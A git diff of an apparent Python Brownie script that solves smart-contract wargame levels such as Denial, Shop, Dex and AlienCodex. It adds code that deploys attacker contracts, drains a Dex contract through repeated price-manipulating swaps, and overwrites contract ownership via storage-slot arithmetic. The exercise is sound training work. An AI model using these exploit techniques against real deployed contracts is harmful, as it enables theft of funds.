@@ -1,6 +1,6 @@
 from brownie import config, accounts, network, chain, web3, Atk_Telephone, Telephone, Delegation, Token, GatekeeperOne, Atk_Gate1, \
     Fallback, Vault, Privacy, GatekeeperTwo, Atk_Gate2, NaughtCoin, Atk_Naughtcoin, Preservation, Atk_Preservation, Atk_Recovery, SimpleToken, \
-    CreateSolver, MagicNum, AlienCodex, Denial
+    CreateSolver, MagicNum, AlienCodex, Denial, Atk_Denial, Shop, Atk_Shop, Dex
 import rlp
 from scripts.config import *
 
@@ -31,21 +31,67 @@ def main():
     # recovery("")
     # magic_number("")
     # alien("")
+    # denial("")
+    # shop("")
+    # dex("")
+    # dex2("")
     pass
+
+
+def dex2(addr):
+    pass
+
+
+def dex(addr):
+    d = Dex.at(addr)
+    t1 = d.token1()
+    t2 = d.token2()
+    d.approve(d, 100000)
+    while (d.balanceOf(t1, addr) != 0) and (d2_bal := d.balanceOf(t2, addr) != 0):
+        t1_balance = d.balanceOf(t1, wallet)
+        t2_price = d.getSwapPrice(t1, t2, t1_balance)
+        if d2_bal >= t2_price > 0:
+            print("swap t1 - t2: ", t1_balance)
+            d.swap(t1, t2, t1_balance)
+        else:
+            pass
+        d1_bal = d.balanceOf(t1, addr)
+        t2_balance = d.balanceOf(t2, wallet)
+        t1_price = d.getSwapPrice(t2, t1, t2_balance)
+        if d1_bal >= t1_price > 0:
+            print("swap t2 - t1: ", t2_balance)
+            d.swap(t2, t1, t2_balance)
+        else:
+            for i in range(t2_balance, 0, -1):
+                if d.getSwapPrice(t2, t1, i) == d1_bal:
+                    t1_price = i
+                    break
+            print("swap t2 - t1: ", t1_price)
+            d.swap(t2, t1, t1_price)
+            break
+
+
+def shop(addr):
+    s = Shop.at(addr)
+    atk = Atk_Shop.deploy(s)
+    atk.atk()
 
 
 def denial(addr):
-    pass
+    d = Denial.at(addr)
+    atk = Atk_Denial.deploy(d)
+    atk.atk()
+
 
 def alien(addr):
     # owner address: 0x0000000000000000000000000000000000000000000000000000000000000000 : 64 hex
-    #array address: 0x0000000000000000000000000000000000000000000000000000000000000001
+    # array address: 0x0000000000000000000000000000000000000000000000000000000000000001
     # array ? element:  keccak(array addres) + ? = owner address
     al = AlienCodex.at(addr)
     al.make_contact()
     al.retract()
     first_element_addr = web3.keccak(hexstr=_slot_to_addr(1)).hex()
-    add = int("f"*64,16) - int(first_element_addr,16) + 1
+    add = int("f" * 64, 16) - int(first_element_addr, 16) + 1
     al.revise(add, wallet.address)
 
     pass
@@ -53,7 +99,6 @@ def alien(addr):
 
 def magic_number(addr):
     m = MagicNum.at(addr)
-
 
     # method 1: using contract create solver
     # parent = CreateSolver.deploy()
